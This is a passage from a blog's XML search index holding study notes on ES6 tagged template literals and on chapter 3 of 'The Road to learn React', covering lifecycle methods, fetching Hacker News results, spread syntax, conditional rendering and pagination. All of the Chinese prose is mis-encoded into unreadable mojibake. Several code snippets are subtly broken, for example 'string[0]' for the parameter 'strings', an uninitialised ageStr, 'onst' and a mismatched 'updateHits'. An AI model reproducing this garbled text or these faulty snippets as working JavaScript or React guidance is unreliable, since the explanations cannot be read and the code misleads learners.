‡ç­¾å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°åŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²å€¼çš„æ•°ç»„ï¼Œå…¶ä½™çš„å‚æ•°ä¸Žè¡¨è¾¾å¼ç›¸å…³ã€‚æœ€åŽï¼Œå‡½æ•°å¯ä»¥è¿”å›žå¤„ç†å¥½çš„å­—ç¬¦ä¸²ã€‚ç”¨äºŽè¯¥æ ‡ç­¾çš„å‡½æ•°çš„åç§°å¯ä»¥è¢«å‘½åä¸ºä»»ä½•åå­— 12345678910111213141516var person = 'Mike'; var age = 28; function myTag(strings,personExp,ageExp)&#123; var str0 = string[0]; var str1 = string[1]; var ageStr; if(ageStr &gt; 99)&#123; ageStr = 'centenarian'; &#125; else&#123; ageStr = 'youngster'; &#125; return str0 + personExp + str1 + ageStr;&#125;var output = myTag `that $&#123;person&#125; is a $&#123;age&#125;`.;console.log(output); // that Mike is a youngster. åŽŸå§‹å­—ç¬¦ä¸²åœ¨æ ‡ç­¾å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ä¸­ï¼Œå­˜åœ¨ä¸€ä¸ªç‰¹æ®Šçš„å±žæ€§ raw,æˆ‘ä»¬å¯ä»¥é€šè¿‡å®ƒæ¥è®¿é—®æ¨¡æ¿å­—ç¬¦ä¸²çš„åŽŸå§‹å­—ç¬¦ä¸²ï¼Œè€Œä¸ç»è¿‡ç‰¹æ®Šå­—ç¬¦ä¸²çš„æ›¿æ¢ 1234567function tag(strings)&#123; console.log(strings.raw[0]);&#125;tag `string text line1 \n string text line 2`// logs "string text line 1 \n string text line 2"// including the two characters '\' and 'n' å¦å¤–ä½¿ç”¨ String.raw() æ–¹æ³•åˆ›å»ºåŽŸå§‹å­—ç¬¦ä¸²å’Œä½¿ç”¨é»˜è®¤æ¨¡æ¿å‡½æ•°å’Œå­—ç¬¦ä¸²è¿žæŽ¥åˆ›å»ºæ˜¯ä¸€æ ·çš„ 12345678var str = String.raw`Hi\n$&#123;2+3&#125;!` //Hi\n5!str.length;//6//str.split('').join(',');//"H,i,\,n,5,!" å¸¦æ ‡ç­¾çš„æ¨¡ç‰ˆå­—é¢é‡åŠè½¬ä¹‰åºåˆ—è‡ªES2016èµ·ï¼Œå¸¦æ ‡ç­¾çš„æ¨¡ç‰ˆå­—é¢é‡éµå®ˆä»¥ä¸‹è½¬ä¹‰åºåˆ—çš„è§„åˆ™ï¼š Unicodeå­—ç¬¦ä»¥â€\uâ€å¼€å¤´ï¼Œä¾‹å¦‚\u00A9Unicodeç ä½ç”¨â€\u{}â€è¡¨ç¤ºï¼Œä¾‹å¦‚\u{2F804}åå…­è¿›åˆ¶ä»¥â€\xâ€å¼€å¤´ï¼Œä¾‹å¦‚\xA9å…«è¿›åˆ¶ä»¥â€\â€å’Œæ•°å­—å¼€å¤´ï¼Œä¾‹å¦‚\251è¿™è¡¨ç¤ºç±»ä¼¼ä¸‹é¢è¿™ç§å¸¦æ ‡ç­¾çš„æ¨¡ç‰ˆæ˜¯æœ‰é—®é¢˜çš„ï¼Œå› ä¸ºå¯¹äºŽæ¯ä¸€ä¸ªECMAScriptè¯­æ³•ï¼Œè§£æžå™¨éƒ½ä¼šåŽ»æŸ¥æ‰¾æœ‰æ•ˆçš„è½¬ä¹‰åºåˆ—ï¼Œä½†æ˜¯åªèƒ½å¾—åˆ°è¿™æ˜¯ä¸€ä¸ªå½¢å¼é”™è¯¯çš„è¯­æ³•ï¼š latex`\unicode` // åœ¨è¾ƒè€çš„ECMAScriptç‰ˆæœ¬ä¸­æŠ¥é”™ï¼ˆES2016åŠæ›´æ—©ï¼‰ // SyntaxError: malformed Unicode character escape sequence]]></content>
      <categories>
        <category>ES6ç›¸å…³</category>
      </categories>
      <tags>
        <tag>ES6</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[The Road to learn React Part3]]></title>
    <url>%2F2018-06-08-TheRoadtolearnReactPart3.html</url>
    <content type="text"><![CDATA[The Road to learn Reactä¹¦ç±å­¦ä¹ ç¬”è®°(ç¬¬ä¸‰ç« )ä»£ç è¯¦æƒ… å£°æ˜Žå‘¨æœŸæ–¹æ³•é€šè¿‡ä¹‹å‰çš„å­¦ä¹ ï¼Œå¯ä»¥äº†è§£åˆ°ES6 ç±»ç»„ä»¶ä¸­çš„ç”Ÿå‘½å‘¨æœŸæ–¹æ³• constructor() å’Œ render()constructor() æž„é€ å‡½æ•°åªæœ‰åœ¨ç»„ä»¶å®žä¾‹åŒ–å¹¶æ’å…¥åˆ° DOM ä¸­çš„æ—¶å€™æ‰ä¼šè¢«è°ƒç”¨ã€‚ç»„ä»¶å®žä¾‹åŒ–çš„è¿‡ç¨‹ç§°ä¸ºç»„ä»¶çš„æŒ‚è½½ mountrender()æ–¹æ³•ä¹Ÿä¼šåœ¨ç»„ä»¶æŒ‚è½½è¿‡ç¨‹ä¸­è¢«è°ƒç”¨ï¼ŒåŒæ—¶ç»„ä»¶æ›´æ–°çš„æ—¶å€™ä¹Ÿä¼šè¢«è°ƒç”¨ã€‚æ¯å½“ç»„ä»¶çš„çŠ¶æ€ state å’Œå±žæ€§ props æ”¹å˜çš„æ—¶å€™ï¼Œç»„ä»¶çš„ render() æ–¹æ³•éƒ½ä¼šè¢«è°ƒç”¨ æŒ‚è½½è¿‡ç¨‹ä¸­æœ‰å››ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³•ï¼Œè°ƒç”¨é¡ºåºæ˜¯è¿™æ ·çš„constructor()componentWillMount()render()componentDidMount() å½“ç»„ä»¶çš„çŠ¶æ€æˆ–è€…å±žæ€§æ”¹å˜çš„æ—¶å€™ç”¨æ¥æ›´æ–°çš„ç”Ÿå‘½å‘¨æœŸå¦‚ä¸‹äº”ä¸ªæ­¥éª¤componentWillReceiveProps()shouldComponentUpdate()componentWillUpdate()render()componentDidUpdate() ç»„ä»¶å¸è½½çš„ç”Ÿå‘½å‘¨æœŸåªæœ‰ä¸€ä¸ªcomponentWillUnmount() ç”Ÿå‘½å‘¨æœŸè¯¦è§£constructor(props)åœ¨ç»„ä»¶åˆå§‹åŒ–çš„æ—¶è¢«è°ƒç”¨ï¼Œåœ¨è¿™ä¸ªæ–¹æ³•ä¸­ï¼Œå¯ä»¥è®¾ç½®åˆå§‹åŒ–çŠ¶æ€ä»¥åŠç»‘å®šç±»æ–¹æ³• componentWillMount()åœ¨ render() æ–¹æ³•ä¹‹å‰è¢«è°ƒç”¨ï¼Œè¿™å°±æ˜¯ä¸ºä»€ä¹ˆå®ƒå¯ä»¥ç”¨ä½œåŽ»è®¾ç½®ç»„ä»¶å†…éƒ¨çš„çŠ¶æ€ï¼Œå› ä¸ºå®ƒä¸ä¼šè§¦å‘ç»„ä»¶çš„å†æ¬¡æ¸²æŸ“ï¼Œä¸€èˆ¬è¿˜æ˜¯æŽ¨èåœ¨ constructor() ä¸­åŽ»åˆå§‹åŒ–çŠ¶æ€ componentDidMount()ä»…åœ¨ç»„ä»¶æŒ‚è½½åŽæ‰§è¡Œä¸€æ¬¡ï¼Œæ˜¯å‘èµ·å¼‚æ­¥è¯·æ±‚åŽ»API èŽ·å–æ•°æ®çš„æœ€å¥½æ—¶æœŸï¼ŒèŽ·å–åˆ°çš„æ•°æ®å°†è¢«ä¿å­˜åœ¨å†…éƒ¨ç»„ä»¶çš„çŠ¶æ€ä¸­ç„¶åŽåœ¨ render() ç”Ÿå‘½å‘¨æœŸæ–¹æ³•ä¸­å±•ç¤ºå‡ºæ¥ componentWillReceviceProps(nextProps)è¿™ä¸ªæ–¹æ³•åœ¨ä¸€ä¸ªæ›´æ–°å£°æ˜Žå‘¨ï¼ˆupdate lifecycleï¼‰ä¸­ä½¿ç”¨ï¼Œ æ–°çš„å±žæ€§ä¼šä½œä¸ºå®ƒçš„è¾“å…¥ï¼Œå› æ­¤å¯ä»¥åˆ©ç”¨ this.props æ¥å¯¹æ¯”ä¹‹åŽçš„å±žæ€§å’Œä¹‹å‰çš„å±žæ€§ï¼ŒåŸºäºŽå¯¹æ¯”çš„ç»“æžœåŽ»å®žçŽ°ä¸åŒçš„è¡Œä¸ºï¼Œæ­¤å¤–è¿˜å¯ä»¥åŸºäºŽæ–°çš„å±žæ€§æ¥è®¾ç½®ç»„ä»¶çš„çŠ¶æ€ shouldComponentUpdate(nextProps,nextState)æ¯æ¬¡ç»„ä»¶å› ä¸ºçŠ¶æ€æˆ–è€…æ˜¯å±žæ€§æ›´æ”¹è€Œæ›´æ–°æ—¶ï¼Œå®ƒéƒ½ä¼šè¢«è°ƒç”¨ã€‚åœ¨æˆç†Ÿçš„Reactåº”ç”¨ä¸­ä½¿ç”¨å®ƒæ¥è¿›è¡Œæ€§èƒ½ä¼˜åŒ–ã€‚åœ¨ä¸€ä¸ªæ›´æ–°å£°æ˜Žå‘¨æœŸä¸­ï¼Œç»„ä»¶ä»¥åŠå…¶ç»„ä»¶å°†æ ¹æ®è¯¥æ–¹æ³•è¿”å›žçš„å¸ƒå°”å€¼æ¥å†³å®šæ˜¯å¦é‡æ–°æ¸²æŸ“ï¼Œè¿™æ ·å°±å¯ä»¥é˜»æ­¢ç»„ä»¶çš„æ¸²æŸ“å£°æ˜Žå‘¨æœŸæ–¹æ³•ï¼Œé¿å…ä¸å¿…è¦çš„æ¸²æŸ“ componentWillUpdate(nextProps,nextState)è¿™ä¸ªæ–¹æ³•æ˜¯ render() æ–¹æ³•æ‰§è¡Œä¹‹å‰çš„æœ€åŽä¸€ä¸ªæ–¹æ³•ï¼Œæ­¤æ—¶æ‹¥æœ‰äº†ä¸‹ä¸€ä¸ªå±žæ€§å’ŒçŠ¶æ€ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªæ–¹æ³•åœ¨æ¸²æŸ“ä¹‹å‰åšæœ€åŽçš„å‡†å¤‡ã€‚æ³¨æ„è¿™ä¸ªå£°æ˜Žå‘¨æœŸä¸èƒ½å†è§¦å‘ setState() å¦‚æžœæƒ³åŸºäºŽæ–°çš„å±žæ€§è®¡ç®—çŠ¶æ€ ,å¿…é¡»ä½¿ç”¨ componentWillReceiveProps() componentDidUpdate(prevProps,prevState)è¿™ä¸ªæ–¹æ³•åœ¨ render() ä¹‹åŽè°ƒç”¨ï¼Œå¯ä»¥ç”¨å®ƒå½“æˆæ“ä½œDOM æˆ–è€…æ˜¯ æ‰§è¡Œæ›´å¤šå¼‚æ­¥è¯·æ±‚çš„æœºä¼š componentWillUnmount()å®ƒä¼šåœ¨ç»„ä»¶é”€æ¯ä¹‹å‰è¢«è°ƒç”¨ï¼Œå¯ä»¥åˆ©ç”¨è¿™ä¸ªå£°æ˜Žå‘¨æœŸæ–¹æ³•åŽ»æ‰§è¡Œä»»ä½•æ¸…ç†ä»»åŠ¡ render() æ˜¯å¿…é¡»æœ‰çš„ï¼Œå¦åˆ™ä¸ä¼šè¿”å›žä¸€ä¸ªç»„ä»¶å®žä¾‹ è¿˜æœ‰ä¸€ä¸ªç”Ÿå‘½å‘¨æœŸæ–¹æ³•componentDidCatch(error,info)åœ¨ React 16 ä¸­å¼•å…¥ï¼Œç”¨æ¥æ•èŽ·ç»„ä»¶çš„é”™è¯¯ã€‚ä¸¾ä¾‹æ¥è¯´ï¼Œåœ¨ä½ çš„åº”ç”¨ä¸­å±•ç¤ºæ ·æœ¬æ•°æ®æœ¬æ¥æ˜¯æ²¡é—®é¢˜çš„ã€‚ä½†æ˜¯å¯èƒ½ä¼šæœ‰åˆ—è¡¨çš„æœ¬åœ°çŠ¶æ€è¢«æ„å¤–è®¾ç½®æˆ null çš„æƒ…å†µå‘ç”Ÿï¼ˆä¾‹å¦‚ä»Žå¤–éƒ¨ API èŽ·å–åˆ—è¡¨å¤±è´¥æ—¶ï¼Œä½ æŠŠæœ¬åœ°çŠ¶æ€è®¾ç½®ä¸ºç©ºäº†ï¼‰ã€‚ç„¶åŽå®ƒå°±ä¸èƒ½åƒä¹‹å‰ä¸€æ ·åŽ»è¿‡æ»¤ï¼ˆfilterï¼‰å’Œæ˜ å°„ï¼ˆmapï¼‰è¿™ä¸ªåˆ—è¡¨ï¼Œå› ä¸ºå®ƒä¸æ˜¯ä¸€ä¸ªç©ºåˆ—è¡¨ï¼ˆ[]ï¼‰è€Œæ˜¯ nullã€‚è¿™æ—¶ç»„ä»¶å°±ä¼šå´©æºƒï¼Œç„¶åŽæ•´ä¸ªåº”ç”¨å°±ä¼šæŒ‚æŽ‰ã€‚çŽ°åœ¨ä½ å¯ä»¥ç”¨componentDidCatch() æ¥æ•èŽ·é”™è¯¯ï¼Œå°†å®ƒå­˜åœ¨æœ¬åœ°çš„çŠ¶æ€ä¸­ï¼Œç„¶åŽåƒç”¨æˆ·å±•ç¤ºä¸€æ¡ä¿¡æ¯ï¼Œè¯´æ˜Žåº”ç”¨å‘ç”Ÿäº†é”™è¯¯ èŽ·å–æ•°æ®ä»Ž Hacker News API èŽ·å–æ•°æ®ã€‚å¯ä»¥åœ¨ componentDidMount() ç”Ÿå‘½å‘¨æœŸæ–¹æ³•æ¥èŽ·å–æ•°æ®,ç”¨JavaScriptåŽŸç”Ÿçš„ fetch API æ¥å‘èµ·è¯·æ±‚åœ¨é‚£ä¹‹å‰ï¼Œå…ˆè®¾ç½®å¥½ URLå¸¸é‡å’Œé»˜è®¤å‚æ•°ï¼Œå°† API è¯·æ±‚åˆ†è§£æˆå‡ æ­¥ 1234567891011121314import React,&#123; Component &#125; from &apos;react&apos;;import &apos;./App.css&apos;const DEFAULT_QUERY = &apos;redux&apos;;const PATH_BASE = &apos;https://hn.algolia.com/api/v1&apos;;const PATH_SEARCH = &apos;/search&apos;;const PARAM_SEARCH = &apos;query=&apos;;åœ¨ES6 ä¸­ å¯ä»¥ç”¨æ¨¡æ¿å­—ç¬¦ä¸²ï¼ˆ`template strings`ï¼‰ æ¥è¿žæŽ¥å­—ç¬¦ä¸²//ES6 const url = `$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;DEFAULT_QUERY&#125;`;//ES5 var url = PATH_BASE + PATH_SEARCH +&apos;?&apos; + PARAM_SEARCH + DEFAULT_QUERY; 123456789101112131415161718192021222324252627282930313233343536...class App extends Component &#123;constructor(props) &#123; super(props); this.state = &#123; result: null, searchTerm: DEFAULT_QUERY, &#125;; this.setSearchTopStories = this.setSearchTopStories.bind(this); this.fetchSearchTopStories = this.fetchSearchTopStories.bind(this); this.onSearchChange = this.onSearchChange.bind(this); this.onDismiss = this.onDismiss.bind(this);&#125;setSearchTopStories(result) &#123; this.setState(&#123; result &#125;);&#125;fetchSearchTopStories(searchTerm) &#123; fetch(`$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;`) .then(response =&gt; response.json()) .then(result =&gt; this.setSearchTopStories(result)) .catch(e =&gt; e);&#125;componentDidMount() &#123; const &#123; searchTerm &#125; = this.state; this.fetchSearchTopStories(searchTerm);&#125;...&#125; ä»Ž Hacker News API å¾—åˆ°ä¸€ä¸ªçœŸå®žçš„åˆ—è¡¨ã€‚ç»„ä»¶å°†ä¸€ä¸ªç©ºçš„åˆ—è¡¨ç»“æžœä»¥åŠä¸€ä¸ªé»˜è®¤çš„æœç´¢è¯ä½œä¸ºåˆå§‹çŠ¶æ€ã€‚è¿™ä¸ªé»˜è®¤æœç´¢è¯ä¹ŸåŒæ ·ç”¨åœ¨ Search ç»„ä»¶çš„è¾“å…¥å­—æ®µå’Œç¬¬ä¸€ä¸ª API è¯·æ±‚ä¸­ã€‚ å…¶æ¬¡ï¼Œåœ¨ç»„ä»¶æŒ‚è½½ä¹‹åŽï¼Œå®ƒç”¨äº† componentDidMount()ç”Ÿå‘½å‘¨æœŸæ–¹æ³•åŽ»èŽ·å–æ•°æ®ã€‚åœ¨ç¬¬ä¸€æ¬¡èŽ·å–æ•°æ®æ—¶ï¼Œä½¿ç”¨çš„æ˜¯æœ¬åœ°çŠ¶æ€ä¸­çš„é»˜è®¤æœç´¢è¯ã€‚å®ƒå°†èŽ·å–ä¸Ž â€œreduxâ€ ç›¸å…³çš„èµ„è®¯ï¼Œå› ä¸ºå®ƒæ˜¯é»˜è®¤çš„å‚æ•°ã€‚ å†æ¬¡ï¼Œè¿™é‡Œä½¿ç”¨çš„æ˜¯åŽŸç”Ÿçš„ fetch APIã€‚JavaScript ES6 æ¨¡æ¿å­—ç¬¦ä¸²å…è®¸ç»„ä»¶åˆ©ç”¨ searchTerm æ¥ç»„æˆ URLã€‚è¯¥ URL æ˜¯åŽŸç”Ÿ fetch API å‡½æ•°çš„å‚æ•°ã€‚è¿”å›žçš„å“åº”éœ€è¦è¢«è½¬åŒ–æˆ JSON æ ¼å¼çš„æ•°æ®ç»“æž„ã€‚è¿™æ˜¯åœ¨å¤„ç† JSON æ•°æ®ç»“æž„æ—¶ï¼ŒåŽŸç”Ÿçš„ fetch API ä¸­çš„å¼ºåˆ¶æ­¥éª¤ã€‚æœ€åŽå°†å¤„ç†åŽçš„å“åº”èµ‹å€¼ç»™ç»„ä»¶å†…éƒ¨çŠ¶æ€ä¸­çš„ç»“æžœã€‚æ­¤å¤–ï¼Œæˆ‘ä»¬ç”¨ä¸€æ®µ catch ä»£ç æ¥å¤„ç†å‡ºé”™çš„æƒ…å†µã€‚å¦‚æžœåœ¨å‘èµ·è¯·æ±‚æ—¶å‡ºçŽ°é”™è¯¯ï¼Œè¿™ä¸ªå‡½æ•°ä¼šè¿›å…¥åˆ° catch ä¸­è€Œä¸æ˜¯ then ä¸­ã€‚åœ¨æœ¬ä¹¦ä¹‹åŽçš„ç« èŠ‚ä¸­ï¼Œå°†æ¶µç›–é”™è¯¯å¤„ç†çš„å†…å®¹ã€‚ æœ€åŽä½†åŒæ ·é‡è¦çš„æ˜¯ï¼Œä¸è¦å¿˜è®°åœ¨æž„é€ å‡½æ•°ä¸­ç»‘å®šä½ çš„ç»„ä»¶æ–¹æ³•ã€‚ æ‹“å±•æ“ä½œç¬¦Dismiss æŒ‰é’®ä¹‹æ‰€ä»¥ä¸å·¥ä½œï¼Œæ˜¯å› ä¸º onDismiss() æ–¹æ³•ä¸èƒ½å¤„ç†å¤æ‚çš„ result å¯¹è±¡ã€‚å®ƒçŽ°åœ¨è¿˜åªèƒ½å¤„ç†ä¸€ä¸ªæœ¬åœ°çŠ¶æ€ä¸­çš„ç®€å•åˆ—è¡¨ã€‚ä½†æ˜¯çŽ°åœ¨è¿™ä¸ªåˆ—è¡¨å·²ç»ä¸å†æ˜¯ç®€å•çš„å¹³é“ºåˆ—è¡¨äº†ã€‚çŽ°åœ¨ï¼Œè®©æˆ‘ä»¬åŽ»æ“ä½œè¿™ä¸ª result å¯¹è±¡è€Œä¸æ˜¯åŽ»æ“ä½œåˆ—è¡¨ã€‚ 12345678910onDismiss(id) &#123;const isNotId = item =&gt; item.objectID !== id;const updatedHits = this.state.result.hits.filter(isNotId);this.setState(&#123; ...&#125;);&#125;/ don`t do thisthis.state.result.hits = updatedHits React æ‹¥æŠ¤ä¸å¯å˜çš„æ•°æ®ç»“æž„ï¼Œä¸åº”è¯¥æ”¹å˜ä¸€ä¸ªå¯¹è±¡æˆ–è€…æ˜¯ç›´æŽ¥æ”¹å˜çŠ¶æ€ã€‚æ›´å¥½çš„åšæ³•æ˜¯åŸºäºŽçŽ°åœ¨æ‹¥æœ‰çš„èµ„æºæ¥åˆ›å»ºä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚javaSrcipt ES6 çš„ Object.assign() å‡½æ•°å¯ä»¥è¾¾åˆ°è¿™æ ·çš„ç›®çš„ã€‚å®ƒæŠŠæŽ¥å—çš„ç¬¬ä¸€ä¸ªå‚æ•°ä½œä¸ºç›®æ ‡å¯¹è±¡ï¼ŒåŽé¢çš„æ‰€æœ‰å‚æ•°ä½œä¸ºæºå¯¹è±¡ï¼Œç„¶åŽæŠŠæ‰€æœ‰çš„æºå¯¹è±¡åˆå¹¶åˆ°ç›®æ ‡å¯¹è±¡ä¸­ã€‚åªè¦å°†ç›®æ ‡å¯¹è±¡è®¾ç½®ä¸ºç©ºï¼Œå°±å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ–°çš„å¯¹è±¡ã€‚ 12const updatedHits = &#123;hits:updatedHits &#125;;const updateList = Object.assign(&#123;&#125;,this.state.result,updateHits); ES6ä¸­æ•°ç»„çš„æ‰©å±•è¿ç®—ç¬¦12345678910111213141516171819202122æ•°ç»„+å­—ç¬¦ä¸²const userList = [&apos;Robin&apos;, &apos;Andrew&apos;, &apos;Dan&apos;];const additionalUser = &apos;Jordan&apos;;const allUsers = [ ...userList, additionalUser ];console.log(allUsers);// output: [&apos;Robin&apos;, &apos;Andrew&apos;, &apos;Dan&apos;, &apos;Jordan&apos;]åˆå¹¶æ•°ç»„onst oldUsers = [&apos;Robin&apos;, &apos;Andrew&apos;];const newUsers = [&apos;Dan&apos;, &apos;Jordan&apos;];const allUsers = [ ...oldUsers, ...newUsers ];console.log(allUsers);// output: [&apos;Robin&apos;, &apos;Andrew&apos;, &apos;Dan&apos;, &apos;Jordan&apos;]å¯¹è±¡const userNames = &#123; firstname: &apos;Robin&apos;, lastname: &apos;Wieruch&apos; &#125;;const userAge = &#123; age: 28 &#125;;const user = &#123; ...userNames, ...userAge &#125;;console.log(user);// output: &#123; firstname: &apos;Robin&apos;, lastname: &apos;Wieruch&apos;, age: 28 &#125; é‡æ–°æ”¹å†™ 1234567onDismiss(id) &#123; const isNotId = item =&gt; item.objectID !== id; const updatedHits = this.state.result.hits.filter(isNotId); this.setState(&#123; result: &#123; ...this.state.result, hits: updatedHits &#125; &#125;);&#125; æ¡ä»¶æ¸²æŸ“æ¡ä»¶æ¸²æŸ“ç”¨äºŽéœ€è¦å†³å®šæ¸²æŸ“å“ªä¸ªå…ƒç´ çš„æ—¶å€™ï¼Œå°±å¯ä»¥ç”¨ JSX ä¸­ if-else æ¥å®žçŽ°ç»„ä»¶å†…éƒ¨çŠ¶æ€ä¸­çš„ result å¯¹è±¡åˆå§‹å€¼ä¸ºç©ºï¼Œå½“ API ç»“æžœè¿˜æ²¡æœ‰è¿”å›žçš„æ—¶å€™ï¼Œæ­¤æ—¶çš„ä¸»ç»„ä»¶ä¸­æ²¡æœ‰ä»»ä½•çš„å…ƒç´ ï¼Œè¿™å°±æ˜¯ä¸€ä¸ªæ¡ä»¶æ¸²æŸ“ï¼Œå› ä¸ºåœ¨æŸä¸ªç‰¹å®šçš„æ¡ä»¶ä¸‹ï¼Œ render() æ–¹æ³•æå‰è¿”å›žäº†ï¼Œæ ¹æ®æ¡ä»¶ï¼Œ ä¸»ç»„ä»¶æ¸²æŸ“å®ƒçš„å…ƒç´ æˆ–è€…ä»€ä¹ˆéƒ½ä¸æ¸²æŸ“ Table ç»„ä»¶çš„æ¸²æŸ“ä¾èµ–äºŽ resultï¼Œæ‰€ä»¥å°†å®ƒåŒ…åœ¨ä¸€ä¸ªç‹¬ç«‹çš„æ¡ä»¶æ¸²æŸ“ä¸­æ‰æ¯”è¾ƒåˆç†ã€‚å³ä½¿ result ä¸ºç©ºï¼Œå…¶å®ƒçš„æ‰€æœ‰ç»„ä»¶è¿˜æ˜¯åº”è¯¥è¢«æ¸²æŸ“ã€‚ä½ åªéœ€è¦åœ¨ JSX ä¸­åŠ ä¸Šä¸€ä¸ªä¸‰å…ƒè¿ç®—ç¬¦å°±å¯ä»¥è¾¾åˆ°è¿™æ ·çš„ç›®çš„ã€‚ 12345678910111213141516return ( &lt;div className=&quot;page&quot;&gt; &lt;div className = &quot;interactions&quot;&gt; &lt;Search value=&#123;searchText&#125; onChange=&#123;this.onSearchChange&#125; /&gt; &#123; result? &lt;Table list=&#123;result.hits&#125; pattern=&#123;searchText&#125; onDismiss=&#123;this.onDismiss&#125;/&gt;:null &#125; &lt;/div&gt; &lt;/div&gt; ) è¿™æ˜¯å®žçŽ°æ¡ä»¶æ¸²æŸ“çš„ç¬¬äºŒç§æ–¹å¼ã€‚ç¬¬ä¸‰ç§åˆ™æ˜¯è¿ç”¨ &amp;&amp; é€»è¾‘è¿ç®—ç¬¦ã€‚åœ¨JavaScriptä¸­ï¼Œ true &amp;&amp; â€˜Hello Worldâ€™ çš„å€¼æ°¸è¿œæ˜¯ â€œHello Worldâ€ã€‚è€Œ false &amp;&amp; â€˜Hello Worldâ€™ çš„å€¼åˆ™æ°¸è¿œæ˜¯ false 1234567const result = true &amp;&amp; &apos;Hello World&apos;;console.log(result);// output: Hello Worldconst result = false &amp;&amp; &apos;Hello World&apos;;console.log(result);// output: false æ‰€ä»¥ä¹Ÿå¯ä»¥è¿™æ ·æ”¹å†™ 1234567&#123; result &amp;&amp; &lt;Table list=&#123;result.hits&#125; pattern=&#123;searchTerm&#125; onDismiss=&#123;this.onDismiss&#125; /&gt;&#125; å®¢æˆ·ç«¯æˆ–è€…æœåŠ¡ç«¯æœç´¢åœ¨ä½¿ç”¨ Search ç»„ä»¶çš„è¾“å…¥æ æ—¶ï¼Œä¼šåœ¨å®¢æˆ·ç«¯è¿‡æ»¤è¿™ä¸ªåˆ—è¡¨ï¼Œæ‰€ä»¥è¦åšçš„æ˜¯ä½¿ç”¨ API åœ¨æœåŠ¡ç«¯è¿›è¡Œæœç´¢ã€‚å¦åˆ™ï¼Œå°±åªèƒ½å¤„ç†ç¬¬ä¸€æ¬¡ä»Ž componentDidMount() æ‹¿åˆ°çš„é»˜è®¤æœç´¢è¯çš„ API å“åº”å¯ä»¥åœ¨ä¸»ç»„ä»¶ä¸­é¡¶ä¸€ä¸ª onSeachSubmit() æ–¹æ³•ï¼Œå½“ Search ç»„ä»¶è¿›è¡Œæœç´¢çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨è¿™ä¸ªæ–¹æ³•æ¥ API èŽ·å–ç»“æžœï¼Œé¡ºä¾¿åœ¨ Search ä¸­å¢žåŠ ä¸€ä¸ªæ–°æŒ‰é’®ï¼Œè¿™ä¸ªæŒ‰é’®å¯ä»¥è§¦å‘æœç´¢è¯·æ±‚ 123456789101112131415161718192021222324252627282930313233343536 class FormP extends Component &#123; constructor(props) &#123; super(props); this.state = &#123; result: null, searchText: DEFAULT_QUERY, &#125;; this.setSearchTopStories = this.setSearchTopStories.bind(this); this.fetchSearchTopStories = this.fetchSearchTopStories.bind(this); this.onSearchChange = this.onSearchChange.bind(this); this.onSearchSubmit = this.onSearchSubmit.bind(this); this.onDismiss = this.onDismiss.bind(this); &#125; .... onSearchSubmit(e) &#123; const &#123; searchText &#125; = this.state; // console.log( searchText); this.fetchSearchTopStories(searchText); e.preventDefault(); &#125;&#125;const Search = (&#123; value, onChange, onSubmit, children &#125;) =&gt; &lt;form onSubmit=&#123;onSubmit&#125; &gt; &lt;input type=&quot;text&quot; value=&#123;value&#125; onChange=&#123;onChange&#125; /&gt; &lt;button type=&quot;submit&quot;&gt; &#123;children&#125; &lt;/button&gt; &lt;/form&gt; åˆ†é¡µæŠ“å–æ”¹é€ ä¸€ä¸‹å¯ç»„åˆ API å¸¸é‡ï¼Œä»¥ä¾¿äºŽå¤„ç†åˆ†é¡µæ•°æ® 123456const DEFAULT_QUERY = &apos;redux&apos;;const PATH_BASE = &apos;https://hn.algolia.com/api/v1&apos;;const PATH_SEARCH = &apos;/search&apos;;const PARAM_SEARCH = &apos;query=&apos;;const PARAM_PAGE = &apos;page=&apos;;const url = `$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;&amp;$&#123;PARAM_PAGE&#125;`; fetchSearchTopStories() å‡½æ•°æŽ¥æ”¶åˆ†é¡µä½œä¸ºç¬¬äºŒä¸ªå‚æ•°ã€‚å¦‚æžœä¸æä¾›ç¬¬äºŒä¸ªå‚æ•°ï¼Œå®ƒå°†ä½¿ç”¨ 0 ä½œä¸ºåˆå§‹å‚æ•°å¹¶å‘èµ·è¯·æ±‚ã€‚å› æ­¤ componentDidMount() å’Œ onSearchSubmit() æ–¹æ³•åœ¨ç¬¬ä¸€ä¸ªè¯·æ±‚ä¸­é»˜è®¤èŽ·å–ç¬¬ä¸€é¡µã€‚ä¹‹åŽçš„è¯·æ±‚å°†æ ¹æ®æä¾›çš„ç¬¬äºŒä¸ªå‚æ•°æŠ“å–ä¸‹ä¸€ä¸ªé¡µé¢çš„æ•°æ®ã€‚ 123456789101112131415 class App extends Component &#123; ... fetchSearchTopStories(searchTerm, page = 0) &#123; fetch(`$&#123;PATH_BASE&#125;$&#123;PATH_SEARCH&#125;?$&#123;PARAM_SEARCH&#125;$&#123;searchTerm&#125;&amp;$&#123;PARAM_PAGE&#125;\$&#123;page&#125;`) .then(response =&gt; response.json()) .then(result =&gt; this.setSearchTopStories(result)) .catch(e =&gt; e); &#125; ...&#125; å®¢æˆ·ç«¯ç¼“å­˜The Road to learn React ä»£ç  é”™è¯¯å¤„ç†The Road to learn React ä»£ç  ä»£ç ç»„ç»‡å’Œæµ‹è¯•æœ¬ç« å°†ä¸“æ³¨åœ¨å‡ ä¸ªé‡è¦è¯é¢˜æ¥ä¿è¯åœ¨ä¸€ä¸ªè§„æ¨¡å¢žé•¿çš„åº”ç”¨ä¸­ä»£ç çš„å¯ç»´æŠ¤æ€§ã€‚ä½ å°†äº†è§£å¦‚ä½•åŽ»ç»„ç»‡ä»£ç ï¼Œä»¥ä¾¿åœ¨æž„å»ºä½ çš„å·¥ç¨‹ç›®å½•å’Œæ–‡ä»¶æ—¶æ—¶éµå¾ªæœ€ä½³å®žè·µã€‚æœ¬ç« ä½ 